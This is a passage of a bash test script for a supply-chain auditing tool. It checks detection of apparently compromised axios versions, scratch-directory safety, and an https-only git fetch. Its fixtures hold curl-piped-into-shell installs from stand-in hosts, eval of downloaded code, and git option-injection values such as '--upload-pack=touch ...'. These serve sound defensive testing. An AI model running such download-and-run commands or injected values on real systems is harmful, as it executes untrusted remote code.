for want in "$MM merge feat" "$MM b/app/package-lock.json +      \"version\": \"1.95.6\"," "$M5 pnpm5"; do
  if has "$T/kb.out" "$want"; then ok "known-bad check, history: $want"; else bad "known-bad check, history, missing: $want"; fi
done

# axios 1.14.1 / 0.30.4 in every shape, beside packages that must not match
X="$T/ax"
git init -q -b main "$X" && cd "$X" && mkdir -p p1 p2 p3 p4 p5 p6 p7 p8 d1 d3 || exit 1
printf '{\n  "dependencies": {\n    "axios": "1.14.1"\n  }\n}\n' > p1/package.json
printf '{\n  "packages": {\n    "node_modules/axios": {\n      "version": "1.14.1",\n      "resolved": "https://registry.npmjs.org/axios/-/axios-1.14.1.tgz",\n      "integrity": "sha512-a"\n    }\n  }\n}\n' > p2/package-lock.json
ax3() { printf '{\n  "packages": {\n    "node_modules/axios": {\n      "version": "%s",\n      "integrity": "sha512-a"\n    },\n    "node_modules/@solana/web3.js": {\n      "version": "0.30.4",\n      "integrity": "sha512-w"\n    }\n  }\n}\n' "$1" > p3/package-lock.json; }
ax3 0.30.4
printf '{\n  "packages": {\n    "node_modules/my-axios": {\n      "name": "axios",\n      "version": "1.14.1",\n      "integrity": "sha512-a"\n    }\n  }\n}\n' > p4/npm-shrinkwrap.json
printf 'axios@^1.14.0:\n  version "1.14.1"\n  resolved "https://registry.yarnpkg.com/axios/-/axios-1.14.1.tgz#abc"\n  integrity sha512-a\n' > p5/yarn.lock
printf '"axios@npm:^1.14.0":\n  version: 1.14.1\n  resolution: "axios@npm:1.14.1"\n  checksum: 10c0/abc\n' > p6/yarn.lock
printf 'packages:\n\n  axios@1.14.1:\n    resolution: {integrity: sha512-a}\n\n  /axios/0.30.4:\n    resolution: {integrity: sha512-b}\n' > p7/pnpm-lock.yaml
printf '{\n  "packages": {\n    "axios": ["axios@1.14.1", "", {}, "sha512-a"],\n  }\n}\n' > p8/bun.lock
printf '{\n  "packages": {\n    "node_modules/vue-axios": {\n      "version": "1.14.1",\n      "resolved": "https://registry.npmjs.org/vue-axios/-/vue-axios-1.14.1.tgz"\n    },\n    "node_modules/@nuxtjs/axios": {\n      "version": "0.30.4"\n    }\n  }\n}\n' > d1/package-lock.json
printf 'packages:\n\n  vue-axios@1.14.1:\n    resolution: {integrity: sha512-v}\n' > d1/pnpm-lock.yaml
printf '{\n  "packages": {\n    "node_modules/axios": {\n      "version": "1.14.2"\n    }\n  }\n}\n' > d3/package-lock.json
XA=$(c all) && ax3 0.30.5 && XB=$(c bump) && git checkout -q "$XA"
cd "$ROOT" || exit 1
run_kb "$X"
for want in \
  './p1/package.json:3:    "axios": "1.14.1"' \
  './p2/package-lock.json:5:      "resolved": "https://registry.npmjs.org/axios/-/axios-1.14.1.tgz",' \
  './p5/yarn.lock:3:  resolved "https://registry.yarnpkg.com/axios/-/axios-1.14.1.tgz#abc"' \
  './p6/yarn.lock:3:  resolution: "axios@npm:1.14.1"' \
  './p7/pnpm-lock.yaml:3:  axios@1.14.1:' \
  './p7/pnpm-lock.yaml:6:  /axios/0.30.4:' \
  './p8/bun.lock:3:    "axios": ["axios@1.14.1", "", {}, "sha512-a"],' \
  './p3/package-lock.json-4-      "version": "0.30.4",' \
  './p4/npm-shrinkwrap.json-5-      "version": "1.14.1",' \
  "$XA all" \
  "$XA b/p4/npm-shrinkwrap.json +      \"version\": \"1.14.1\"," \
  "$XB b/p3/package-lock.json -      \"version\": \"0.30.4\","; do
  if has "$T/kb.out" "$want"; then ok "known-bad check, axios: $want"; else bad "known-bad check, axios, missing: $want"; fi
done
if ! grep -q -e '/d1/' -e '/d3/' -e ' b/d1/' -e ' b/d3/' "$T/kb.out" && [ "$(grep -c 'p3/package-lock' "$T/kb.out")" = 3 ]; then
  ok "known-bad check skips vue-axios, @nuxtjs/axios, axios 1.14.2 and @solana/web3.js at an axios version"
else bad "known-bad check reports a package it should skip"; sed 's/^/  | /' "$T/kb.out"; fi

# ---- 3. scratch-directory recipes -----------------------------------------------------------------------
kv_step "$KV089" 1 > "$T/kv1.sh"; kv_step "$KV089" 2 > "$T/kv2.sh"; kv_step "$KV089" 5 > "$T/kv5.sh"
cat "$T/kv1.sh" "$T/kv2.sh" > "$T/kv12.sh"
mkdir -p "$T/stub" "$T/tgt/apps/backend" "$T/tgt/apps/web" "$T/tmp"
for p in apps/backend apps/web; do echo '{}' > "$T/tgt/$p/package.json"; echo '{}' > "$T/tgt/$p/package-lock.json"; done
echo '# lock' > "$T/tgt/Cargo.lock"
for s in npm cargo rustup; do
  printf '#!/bin/sh\necho "%s $PWD" >> "%s/ran"\n[ "$1" = default ] && echo "stable-x (default)"\nexit 0\n' "$s" "$T" > "$T/stub/$s"
done
chmod +x "$T/stub/npm" "$T/stub/cargo" "$T/stub/rustup"
scratch_dir=$T/tgt   # the working directory the recipes start in
scratch_case() { # scratch_case NAME SCRIPT WANT [env assignment...]: WANT is the expected OUTCOME line, or "" for a run
  local name=$1 script=$2 want=$3; shift 3
  : > "$T/ran"
  ( cd "$scratch_dir" && env "$@" PATH="$T/stub:$PATH" bash "$script" ) > "$T/sc.out" 2>&1
  if [ -n "$want" ]; then
    if grep -qxF "$want" "$T/sc.out" && [ ! -s "$T/ran" ] && [ -z "$(ls -A "$T/tmp")" ]; then ok "$name: prints '$want' and runs nothing"
    else bad "$name"; sed 's/^/  | /' "$T/sc.out" "$T/ran"; fi
  else
    if [ -s "$T/ran" ] && ! grep -q 'OUTCOME: no scratch copy' "$T/sc.out" && ! grep -qvF " $T/tmp/auditor-scratch." "$T/ran"; then
      ok "$name: npm runs only in the scratch directory"
    else bad "$name"; sed 's/^/  | /' "$T/sc.out" "$T/ran"; fi
  fi
}
scratch_case "KV-089 Step 2, SCRATCH unset" "$T/kv2.sh" "OUTCOME: no scratch copy (run Step 1 first)" -u SCRATCH TMPDIR="$T/tmp"
scratch_case "KV-089 Step 2, SCRATCH empty" "$T/kv2.sh" "OUTCOME: no scratch copy (run Step 1 first)" SCRATCH= TMPDIR="$T/tmp"
scratch_case "KV-089 Step 2, SCRATCH a missing directory" "$T/kv2.sh" "OUTCOME: no scratch copy (run Step 1 first)" \
  SCRATCH="$T/missing" TMPDIR="$T/tmp"
scratch_case "KV-089 Step 1, mktemp fails" "$T/kv1.sh" "OUTCOME: no scratch copy (check TMPDIR)" TMPDIR="$T/missing"
mkdir -p "$T/tgt/rel" "$T/tgt/inside" "$T/tgt/tmpin" "$T/tgt/reltmp"
scratch_case "KV-089 Step 2, SCRATCH a relative path" "$T/kv2.sh" "OUTCOME: no scratch copy (run Step 1 first)" SCRATCH=rel \
  TMPDIR="$T/tmp"
scratch_case "KV-089 Step 2, SCRATCH inside the working directory" "$T/kv2.sh" "OUTCOME: no scratch copy (run Step 1 first)" \
  SCRATCH="$T/tgt/inside" TMPDIR="$T/tmp"
scratch_case "KV-089 Step 1, TMPDIR a relative path" "$T/kv1.sh" "OUTCOME: no scratch copy (check TMPDIR)" TMPDIR=reltmp
# Paths compared with their links resolved: a TMPDIR or a $SCRATCH that names a link into the working directory,
# and a working directory entered through a link, whose $PWD is not the path mktemp's directory resolves under
ln -s "$T/tgt/tmpin" "$T/tmplink" && ln -s "$T/tgt/inside" "$T/sclink" && ln -s "$T/tgt" "$T/tgtlink" || exit 1
scratch_case "KV-089 Step 1, TMPDIR a link from outside the working directory into it" "$T/kv1.sh" \
  "OUTCOME: no scratch copy (check TMPDIR)" TMPDIR="$T/tmplink"
scratch_case "KV-089 Step 2, SCRATCH a link to a directory inside the working directory" "$T/kv2.sh" \
  "OUTCOME: no scratch copy (run Step 1 first)" SCRATCH="$T/sclink" TMPDIR="$T/tmp"
scratch_dir=$T/tgtlink
scratch_case "KV-089 Step 1, the working directory entered through a link, TMPDIR inside it" "$T/kv1.sh" \
  "OUTCOME: no scratch copy (check TMPDIR)" TMPDIR="$T/tgt/tmpin"
scratch_case "KV-089 Steps 1 and 2 in one shell, from the working directory entered through a link" "$T/kv12.sh" "" TMPDIR="$T/tmp"
scratch_dir=$T/tgt
scratch_case "KV-089 Steps 1 and 2 in one shell" "$T/kv12.sh" "" TMPDIR="$T/tmp"
# KV-089 Step 5 is FULL-AUDIT Step 3.2's cargo audit, through deps.sh
grep -E '^"<auditor-skill root>/scripts/runner/deps\.sh" cargo-audit ' "$T/kv5.sh" > "$T/kv5-deps.txt"
if [ "$(grep -cv '^#' "$T/kv5.sh")" = 1 ] && [ "$(grep -c . "$T/kv5-deps.txt")" = 1 ] \
   && grep -qxF "  $(cat "$T/kv5-deps.txt")" "$FA"; then
  ok "KV-089 Step 5 runs cargo audit through deps.sh, as FULL-AUDIT Step 3.2 does"
else bad "KV-089 Step 5 is not FULL-AUDIT Step 3.2's deps.sh cargo-audit call"; sed 's/^/  | /' "$T/kv5.sh"; fi
# FULL-AUDIT Step 3.2: npm audit, cargo audit and the quarantine query run through deps.sh, and nothing in the
# step makes a scratch directory, changes directory or runs npm, cargo or rustup itself.
fa_step32 > "$T/fa32.txt"; grep -v '^ *#' "$T/fa32.txt" > "$T/fa32-code.txt"
deps=$(grep -cE '^"<auditor-skill root>/scripts/runner/deps\.sh" (npm-audit|cargo-audit|npm-time) --run audit_<n> ' "$T/fa32.txt")
if [ "$deps" = 4 ] && ! grep -qE 'SCRATCH|mktemp|(^|[ ;&|(])cd |^ *[(]?(npm|cargo|rustup) ' "$T/fa32-code.txt"; then
  ok "FULL-AUDIT Step 3.2 runs npm audit, cargo audit and the quarantine query through deps.sh, with no scratch block"
else bad "FULL-AUDIT Step 3.2: $deps deps.sh lines, or a scratch block or a plain npm, cargo or rustup call is left"; fi

# ---- 4. KV-137 Steps 1 and 2: upstream fetched into a git-ro.sh copy --------------------------------------
U="$T/kv137"
filler137() { # 400 upstream commits under programs/ with long subjects, so the log Step 2 cuts at 40 lines passes 64 KiB
  local i=1 pad
  pad=$(printf '%0200d' 0)
  while [ "$i" -le 400 ]; do
    printf 'commit refs/heads/trunk\ncommitter t <t@example.invalid> %s +0000\ndata <<EOT\nfiller %s %s\nEOT\n' \
      "$((1700000000 + i))" "$i" "$pad"
    if [ "$i" = 1 ]; then printf 'from refs/heads/trunk^0\n'; fi
    printf 'M 100644 inline programs/p/filler.rs\ndata <<EOT\n%s\nEOT\n\n' "$i"
    i=$((i + 1))
  done | git -C "$U/up" fast-import --quiet
}
git init -q -b trunk "$U/up" && mkdir -p "$U/up/programs/p" && echo v1 > "$U/up/programs/p/lib.rs" \
  && (cd "$U/up" && c v1 > /dev/null) && git clone -q "$U/up" "$U/client" && filler137 && git -C "$U/up" reset -q --hard \
  && echo fix > "$U/up/programs/p/fix.rs" && (cd "$U/up" && c "upstream security fix" > /dev/null) \
  && echo t > "$U/client/tenant" && (cd "$U/client" && c tenant > /dev/null) || exit 1
printf '#!/bin/sh\ntouch "%s/fired-$1"\n' "$U" > "$U/canary.sh" && chmod +x "$U/canary.sh"
git -C "$U/client" config core.fsmonitor "$U/canary.sh fsmonitor"
for h in post-checkout reference-transaction; do
  printf '#!/bin/sh\ntouch "%s/fired-%s"\n' "$U" "$h" > "$U/client/.git/hooks/$h"; chmod +x "$U/client/.git/hooks/$h"
done
# The upstream's https URL, which the test's git config rewrites to the local upstream, and a solana-verify stub
# that records its arguments, one per line.
URL=https://upstream.example.invalid/vendor/program
printf '[url "%s"]\n\tinsteadOf = %s\n' "$U/up" "$URL" > "$U/gitconfig"
mkdir -p "$U/bin" && printf '#!/bin/sh\nprintf "%%s\\n" "$@" > "%s/verify-args"\n' "$U" > "$U/bin/solana-verify" \
  && chmod +x "$U/bin/solana-verify" || exit 1
refs_before=$(git -C "$U/client" for-each-ref | wc -l | tr -d ' ')
deployed=$(git -C "$U/up" rev-list --max-parents=0 HEAD)
logsize=$(git -C "$U/up" log --oneline "$deployed..HEAD" -- programs/ | wc -c | tr -d ' ')
step137() { # step137 UPSTREAM_REPO DEPLOYED: Step 2 up to its log line, placeholders filled, for a new run directory
  R137=$(cd "$U/client" && "$ROOT/scripts/rundir.sh" new audit) || { bad "rundir.sh new audit failed in the KV-137 fixture"; return 1; }
  awk '/^\*\*Step 2:/ {s = 1} s && !g && /^```$/ {g = 1; next} g {print} g && /FETCH_HEAD -- programs\/ \| head -40$/ {exit}' "$KV137" \
    | sed -e "s#<auditor-skill root>#$ROOT#g; s#<copy>#$R137/src.git#g; s#audit_<n>#$R137#g; s#<UPSTREAM_REPO>#$1#" \
          -e "s#<deployed_commit>#$2#; s#<PROGRAM_ID>#Prog1111#" > "$T/kv137.sh"
}
copy137() { [ -f "$U/client/$R137/src.git/auditor-copy" ]; }   # the run directory holds the copy git-ro.sh made
run137() { # run137 [env argument...]: run it in the checkout, the stub first on PATH, with no canary or record left
  rm -f "$U"/fired-* "$U/verify-args"
  ( cd "$U/client" && env "$@" GIT_CONFIG_GLOBAL="$U/gitconfig" PATH="$U/bin:$PATH" bash "$T/kv137.sh" ) \
    > "$T/kv137.out" 2>&1
}
fired() { ls "$U" | grep '^fired-'; }
NOFETCH='OUTCOME: upstream URL is not an https:// URL; not fetched'
mkdir -p "$T/tmp137" "$U/client/rel"

step137 "$URL" "$deployed"; run137 TMPDIR="$T/tmp137"
if grep -q ' upstream security fix$' "$T/kv137.out" && [ -z "$(fired)" ] && [ "$logsize" -gt 65536 ] \
   && [ "$(grep -cE '^[0-9a-f]{7,} (filler [0-9]+ 0+|upstream security fix)$' "$T/kv137.out")" = 40 ] \
   && [ "$(git -C "$U/client" for-each-ref | wc -l | tr -d ' ')" = "$refs_before" ] \
   && copy137 && [ -f "$U/client/$R137/src.git/FETCH_HEAD" ] \
   && [ "$(git --git-dir="$U/client/$R137/src.git" rev-parse --is-bare-repository)" = true ] \
   && [ "$(cat "$U/verify-args" 2>/dev/null)" = "$(printf 'verify-from-repo\n-um\n--program-id\nProg1111\n%s' "$URL")" ]; then
  ok "KV-137 Step 2 lists the fix on upstream's default branch, cut at 40 lines from a $logsize-byte log, from a bare copy in the run directory, gives solana-verify the URL as one argument, and leaves the checkout alone"
else bad "KV-137 Step 2 (log of $logsize bytes)"; sed 's/^/  | /' "$T/kv137.out"; fi
step137 "$URL" "$deployed"; run137 -u GIT_ALLOW_PROTOCOL TMPDIR="$T/tmp137"
if grep -q "transport 'file' not allowed" "$T/kv137.out" && ! grep -q ' upstream security fix$' "$T/kv137.out" \
   && copy137 && [ -z "$(fired)" ]; then
  ok "KV-137 Step 2 fetches over https only: git config that rewrites the URL to a local repository does not get it fetched"
else bad "KV-137 Step 2 fetched over a transport other than https"; sed 's/^/  | /' "$T/kv137.out"; fi
step137 "$URL" "$deployed"; run137 TMPDIR=rel
if has "$T/kv137.out" "git-ro: refused: the scratch directory (TMPDIR) lies inside the working directory" \
   && [ ! -e "$U/client/$R137/src.git" ] && ! grep -q ' upstream security fix$' "$T/kv137.out"; then
  ok "KV-137 Step 2 with a TMPDIR inside the working directory: git-ro.sh copy refuses, and nothing is fetched or read"
else bad "KV-137 Step 2 with a TMPDIR inside the working directory"; sed 's/^/  | /' "$T/kv137.out"; fi

# an option-shaped remote.upstream.url in the checkout's config: Step 1 prints it, and Step 2 gets it as written
opt="--upload-pack=touch $U/fired-upload-pack;:"
git -C "$U/client" config remote.upstream.url "$opt"
kv_step "$KV137" 1 | sed "s#<auditor-skill root>#$ROOT#g" > "$T/kv137-1.sh"; rm -f "$U"/fired-*
( cd "$U/client" && bash "$T/kv137-1.sh" ) > "$T/kv137-1.out" 2>&1
if has "$T/kv137-1.out" "$opt" && [ -z "$(fired)" ]; then ok "KV-137 Step 1 prints the checkout's remote.upstream.url as data"
else bad "KV-137 Step 1 with an option-shaped remote.upstream.url"; sed 's/^/  | /' "$T/kv137-1.out"; fi
step137 "$opt" "$deployed"; run137 TMPDIR="$T/tmp137"
if has "$T/kv137.out" "$NOFETCH" && [ -z "$(fired)" ] && [ ! -e "$U/verify-args" ] \
   && copy137 && [ ! -e "$U/client/$R137/src.git/FETCH_HEAD" ]; then
  ok "KV-137 Step 2 drops an option-shaped upstream URL: no canary fires, and neither solana-verify nor git runs on it"
else bad "KV-137 Step 2 with an option-shaped upstream URL"; fired | sed 's/^/  | fired: /'; sed 's/^/  | /' "$T/kv137.out"; fi
for v in "$U/up" "file://$U/up"; do
  case "$v" in file:*) what="a file:// URL" ;; *) what="a local path" ;; esac
  step137 "$v" "$deployed"; run137 TMPDIR="$T/tmp137"
  if has "$T/kv137.out" "$NOFETCH" && ! grep -q ' upstream security fix$' "$T/kv137.out" && [ ! -e "$U/verify-args" ]; then
    ok "KV-137 Step 2 fetches nothing from $what"
  else bad "KV-137 Step 2 used $what as the upstream"; sed 's/^/  | /' "$T/kv137.out"; fi
done
# an option-shaped deployed commit is refused before git reads it, never taken as a git log option
step137 "$URL" "--output=$U/fired-output"; run137 TMPDIR="$T/tmp137"
if [ -z "$(fired)" ] && ! grep -q ' upstream security fix$' "$T/kv137.out" \
   && grep -q '^git-ro: refused: log does not allow --output=' "$T/kv137.out" && [ -f "$U/client/$R137/src.git/FETCH_HEAD" ]; then
  ok "KV-137 Step 2 refuses an option-shaped deployed commit, and git never takes it as an option"
else bad "KV-137 Step 2 with an option-shaped deployed commit"; fired | sed 's/^/  | fired: /'; sed 's/^/  | /' "$T/kv137.out"; fi
# SC-054 names the fetch and log forms Step 2 runs
sc054=$(grep -F '**SC-054**' "$CL"); st137=$(kv_step "$KV137" 2); miss=
for w in '-c protocol.allow=never -c protocol.https.allow=always' 'fetch --no-tags --end-of-options "$UPSTREAM" HEAD' \
         'log --oneline --end-of-options <deployed' 'https://'; do
  case "$sc054" in *"$w"*) ;; *) miss="$miss SC-054:'$w'" ;; esac
  case "$st137" in *"$w"*) ;; *) miss="$miss Step-2:'$w'" ;; esac
done
if [ -z "$miss" ]; then ok "SC-054 names the https-only fetch and the log form KV-137 Step 2 runs"
else bad "SC-054 and KV-137 Step 2 differ, missing:$miss"; fi

# ---- the manifest reads, as the corpus prints them, on a PATH with no npm or node: KV-076 Step 4 counts the locked
# packages that run an install script, KV-078 Step 10 finds a secret-scanning hook tool among the declared
# dependencies, and KV-049 Step 4 and KV-089 Step 3 read the Node.js runtime the target declares, never the
# auditor's own, with node_modules left out
MF="$T/manifests"
mkdir -p "$MF/apps/backend" "$MF/apps/web" "$MF/node_modules/x" "$MF/node_modules/y" "$MF/srv" "$MF/mpath" || exit 1
printf '{\n  "name": "m",\n  "lockfileVersion": 3,\n  "packages": {\n    "": {"name": "m"},\n    "node_modules/a": {\n      "version": "1.0.0",\n      "hasInstallScript": true\n    },\n    "node_modules/b": {\n      "version": "1.0.0"\n    },\n    "node_modules/c": {\n      "version": "2.0.0",\n      "hasInstallScript": true\n    }\n  }\n}\n' > "$MF/package-lock.json"
printf '{\n  "name": "m",\n  "engines": {\n    "node": ">=18"\n  },\n  "devDependencies": {\n    "husky": "^9.0.0",\n    "@types/node": "^20.0.0"\n  }\n}\n' > "$MF/package.json"
printf '{\n  "name": "backend",\n  "engines": {\n    "node": "20.x"\n  }\n}\n' > "$MF/apps/backend/package.json"
printf '{\n  "name": "web"\n}\n' > "$MF/apps/web/package.json"
printf '20.11.1\n' > "$MF/.nvmrc"; printf '18\n' > "$MF/apps/backend/.nvmrc"
printf 'FROM node:18-alpine\n' > "$MF/srv/Dockerfile"; printf 'FROM node:8\n' > "$MF/node_modules/x/Dockerfile"
printf '{\n  "name": "x",\n  "engines": {\n    "node": ">=4"\n  },\n  "scripts": {\n    "postinstall": "node x.js"\n  }\n}\n' > "$MF/node_modules/x/package.json"
printf '{\n  "name": "y"\n}\n' > "$MF/node_modules/y/package.json"   # two packages, so grep names the file with GNU grep too
for t in bash sh grep cat head sed; do p=$(type -P "$t" 2>/dev/null) && ln -s "$p" "$MF/mpath/$t"; done
mf_step() { # mf_step FILE N: the step's code block, run in the fixture on that PATH; its output in $T/mf.out
  kv_step "$1" "$2" > "$T/mf-step.sh"
  (cd "$MF" && env -i PATH="$MF/mpath" HOME="$T" LC_ALL=C bash "$T/mf-step.sh") > "$T/mf.out" 2>&1 </dev/null
}
mf_step "$ROOT/known-vectors/076-dependency-confusion-substitution-attack.md" 4
if [ "$(sed -n 1p "$T/mf.out")" = 2 ] && grep -q '^node_modules/x/package.json: *"postinstall": "node x.js"$' "$T/mf.out" \
   && [ "$(grep -c '' "$T/mf.out")" = 2 ]; then
  ok "KV-076 Step 4 counts the 2 locked packages that run an install script, and lists the postinstall line, with no npm"
else bad "KV-076 Step 4 on the manifests fixture"; sed 's/^/  | /' "$T/mf.out"; fi
mf_step "$ROOT/known-vectors/078-secrets-in-git-history.md" 10
if [ "$(cat "$T/mf.out")" = '    "husky": "^9.0.0",' ]; then
  ok "KV-078 Step 10 finds husky among the declared dependencies, with no npm"
else bad "KV-078 Step 10 on the manifests fixture"; sed 's/^/  | /' "$T/mf.out"; fi
# KV-078 Step 12 reads .yml and .yaml workflows alike, and runs under failglob, as zsh, the Bash tool's shell, stops a
# command whose glob matches nothing: a tree whose only workflow is .yaml has its secret-scanning step listed.
mkdir -p "$T/kv078/.github/workflows" || exit 1
printf 'jobs:\n  scan:\n    steps:\n      - uses: gitleaks/gitleaks-action@v2\n' > "$T/kv078/.github/workflows/scan.yaml"
kv_step "$ROOT/known-vectors/078-secrets-in-git-history.md" 12 > "$T/kv078-12.sh"
(cd "$T/kv078" && env -i PATH="$MF/mpath" HOME="$T" LC_ALL=C bash -O failglob "$T/kv078-12.sh") > "$T/kv078-12.out" 2>&1 </dev/null
if grep -q 'gitleaks/gitleaks-action@v2' "$T/kv078-12.out"; then
  ok "KV-078 Step 12 lists the secret-scanning step of a .yaml workflow, under failglob too"
else bad "KV-078 Step 12 on a tree whose only workflow is .yaml"; sed 's/^/  | /' "$T/kv078-12.out"; fi
mf_step "$ROOT/known-vectors/049-http-response-splitting.md" 4
printf '%s\n' '4:    "node": ">=18"' './.nvmrc:20.11.1' './apps/backend/.nvmrc:18' './srv/Dockerfile:1:FROM node:18-alpine' > "$T/mf.want"
sort "$T/mf.want" > "$T/mf.wsort"; sort "$T/mf.out" > "$T/mf.osort"   # the recursive grep's order varies by platform
if cmp -s "$T/mf.wsort" "$T/mf.osort"; then
  ok "KV-049 Step 4 reads the declared runtime (engines, the .nvmrc of the root and apps, a Dockerfile's node image), not the auditor's node"
else bad "KV-049 Step 4 on the manifests fixture"; sed 's/^/  | /' "$T/mf.out"; fi
mf_step "$KV089" 3
printf '%s\n' 'package.json:4:    "node": ">=18"' 'apps/backend/package.json:4:    "node": "20.x"' './.nvmrc:20.11.1' './apps/backend/.nvmrc:18' \
  './srv/Dockerfile:1:FROM node:18-alpine' > "$T/mf.want"
sort "$T/mf.want" > "$T/mf.wsort"; sort "$T/mf.out" > "$T/mf.osort"   # the recursive grep's order varies by platform
if cmp -s "$T/mf.wsort" "$T/mf.osort"; then
  ok "KV-089 Step 3 reads the declared runtime of the root and both apps, not the auditor's node, without node_modules"
else bad "KV-089 Step 3 on the manifests fixture"; sed 's/^/  | /' "$T/mf.out"; fi

# ---- 5. SC-063, SC-064, SC-065 and PY-050 as the corpus writes them -----------------------------------------
# SC-064's installer locator, run from a tree's root under bash with failglob, so a glob left unquoted stops it as
# it stops zsh, the shell the Bash tool runs: it lists Anza's sh -c "$(curl …)" install and bash -ec, curl or wget
# piped into a shell (ash and mksh too, and $(SHELL)) by any path (/bin/bash, /usr/bin/env bash), quoted or escaped,
# and through sudo, any download with a URL piped into a shell, on a continued line too, a pipe into a shell that
# opens a continued line, sh -c with backticks or with other commands before the download, process substitutions,
# the rustup, Agave and avm installers, cargo install and binstall, in every text file: .yml and .yaml workflows, a
# Dockerfile RUN in shell and exec form, scripts with and without an extension in subdirectories, Python and
# JavaScript scripts, a Makefile, a Jenkinsfile, a Vagrantfile, Terraform, a package.json and a devcontainer.json
# script, a TOML script array, a Rust comment, a CRLF line too; and nothing under node_modules/ or target/, nor in a
# binary file, nor a download, a checksum check or a shell name inside another word or after a . _ or - (a file
# name).
item() { awk -v id="- [ ] **$2**:" 'index($0, id) == 1' "$1"; }   # item FILE ID: the line of a checklist item
span() { awk -v p="$1" '{ n = split($0, a, "`"); for (i = 2; i <= n; i += 2) if (index(a[i], p) == 1) print a[i] }'; }
SC="$T/sc064"
mkdir -p "$SC/.github/workflows" "$SC/docker/alpine" "$SC/scripts/ci" "$SC/node_modules/x" "$SC/target/debug" "$SC/src" \
  "$SC/.devcontainer" "$SC/sub" "$SC/.github/scripts" "$SC/script" "$SC/ci" "$SC/infra" || exit 1
printf '%s\n' 'name: ci' 'on: push' 'jobs:' '  build:' '    steps:' \
  '      - run: sh -c "$(curl -sSfL https://release.anza.xyz/stable/install)"' \
  "      - run: curl --proto '=https' --tlsv1.2 -sSfL https://solana-install.solana.workers.dev | bash" \
  "      - run: curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y" \
  '      - run: wget -qO- https://get.example.invalid/install.sh | sudo -E bash' \
  '      - run: bash <(curl -sSfL https://get.example.invalid/i)' '      - run: avm install latest && avm use latest' \
  '      - run: curl -sSfLo tools.tgz https://example.invalid/tools.tgz' \
  '      - run: curl -sSfL https://example.invalid/sums.txt | shasum -a 256 -c' '      - run: echo done | shellcheck -' \
  "      - run: 'curl -fsSL https://get.example.invalid/q | sh'" \
  '      - run: curl -fsSL https://get.example.invalid/e | /usr/bin/env bash' \
  '      - run: curl -fsSL https://get.example.invalid/u | sudo -u root bash -s -- --yes' \
  '      - run: bash -ec "$(curl -fsSL https://get.example.invalid/ec)"' \
  '      - run: bash < <(curl -fsSL https://get.example.invalid/pp)' \
  '      - run: curl -fsSL https://example.invalid/x.json | jq -r .sh' \
  '      - run: rustup component add clippy && rustup target add wasm32-unknown-unknown' > "$SC/.github/workflows/ci.yml"
printf 'on: push\njobs:\n  r:\n    steps:\n      - run: curl -fsSL https://get.example.invalid | zsh\r\n' > "$SC/.github/workflows/release.yaml"
printf '%s\n' 'FROM debian' 'RUN curl -sSfL https://release.anza.xyz/v2.1.0/install | sh' \
  'RUN cargo install --git https://github.com/coral-xyz/anchor avm --locked --force' \
  'RUN curl -fsSL https://get.example.invalid/i.sh | /bin/bash' \
  'RUN ["/bin/sh", "-c", "curl -fsSL https://get.example.invalid/j.sh | sh"]' \
  'RUN cargo +nightly install cargo-fuzz && cargo binstall -y cargo-nextest' > "$SC/docker/Dockerfile.build"
printf 'setup:\n\tcurl -sSf https://sh.rustup.rs | sh\n\tcurl -fsSL https://example.invalid/a | tee install.sh\n' > "$SC/Makefile"
printf '\tcurl -fsSL https://get.example.invalid/t.sh | $(SHELL)\n' >> "$SC/Makefile"
printf '%s\n' '#!/bin/sh' 'agave-install init 2.1.0' 'rustup toolchain install 1.79.0' 'rustup update stable' > "$SC/scripts/setup.sh"
printf '%s\n' '#!/bin/sh' 'wget -qO- https://get.example.invalid/w.sh | sh' \
  'curl -fsSL https://get.example.invalid/s.sh | sudo -E bash -' 'eval "$(curl -fsSL https://get.example.invalid/ev)"' \
  > "$SC/scripts/ci/setup.sh"
printf '%s\n' '{"scripts": {"setup": "sh -c \"$(curl -fsSL https://example.invalid/i)\"",' \
  '  "postinstall": "curl -fsSL https://get.example.invalid/n.sh | sh",' '  "x": "echo"}}' > "$SC/package.json"
printf '%s\n' '{' '  "postCreateCommand": "curl -fsSL https://get.example.invalid/d.sh | bash",' '  "name": "x"' '}' \
  > "$SC/.devcontainer/devcontainer.json"
printf '%s\n' '[tasks.setup]' 'script = ["curl -fsSL https://get.example.invalid/t.sh | sh", "echo"]' > "$SC/sub/Makefile.toml"
printf 'curl x | sh\n' > "$SC/node_modules/x/install.sh"; printf '{"cmd": "curl x | sh"}\n' > "$SC/target/debug/x.json"
printf '// curl x | sh\n' > "$SC/src/lib.rs"; printf 'curl x | sh\0\n' > "$SC/scripts/blob.bin"
printf '%s\n' '#!/bin/sh' 'set -e' 'curl -sSf https://sh.rustup.rs | sh -s -- -y' > "$SC/scripts/bootstrap"
printf '%s\n' '#!/bin/bash' 'sh -c "$(curl -sSfL https://release.anza.xyz/stable/install)"' > "$SC/scripts/install-solana"
printf '%s\n' 'import os' 'os.system("curl -sSfL https://get.example.invalid/p.sh | sh")' > "$SC/scripts/setup.py"
printf '%s\n' 'const { execSync } = require("child_process");' \
  'execSync("curl -fsSL https://get.example.invalid/j.sh | bash");' > "$SC/scripts/setup.js"
printf '%s\n' '#!/bin/bash' 'curl -sSfL https://release.anza.xyz/v2.1.0/install | sh' > "$SC/ci/install-agave"
printf '%s\n' '#!/bin/bash' 'curl -fsSL https://get.example.invalid/g.sh | bash' > "$SC/.github/scripts/setup"
printf '%s\n' '#!/bin/sh' 'curl -fsSL https://get.example.invalid/b.sh | sh' > "$SC/script/bootstrap"
printf '%s\n' 'pipeline {' "  stages { stage('s') { steps { sh 'curl -fsSL https://get.example.invalid/k.sh | sh' } } }" \
  '}' > "$SC/Jenkinsfile"
printf '%s\n' 'Vagrant.configure("2") do |config|' \
  '  config.vm.provision "shell", inline: "curl -fsSL https://get.example.invalid/v.sh | bash"' 'end' > "$SC/Vagrantfile"
printf '%s\n' 'resource "aws_instance" "a" {' '  user_data = "curl -fsSL https://get.example.invalid/t.sh | sh"' '}' \
  > "$SC/infra/main.tf"
printf '%s\n' 'FROM debian' 'RUN curl -sSfL https://example.invalid/a.sh \' '    | sh -s -- -y' > "$SC/docker/Dockerfile"
printf '%s\n' 'FROM alpine' 'RUN wget -qO- https://get.example.invalid/a.sh | ash' > "$SC/docker/alpine/Dockerfile"
printf '%s\n' 'FROM debian' 'RUN curl --proto =https --tlsv1.2 -sSfL \' \
  '    https://get.example.invalid/install.sh | bash -s -- -y' > "$SC/docker/Dockerfile.wrap"
printf '%s\n' '#!/bin/sh' 'curl -fsSL https://get.example.invalid/q.sh | "bash"' \
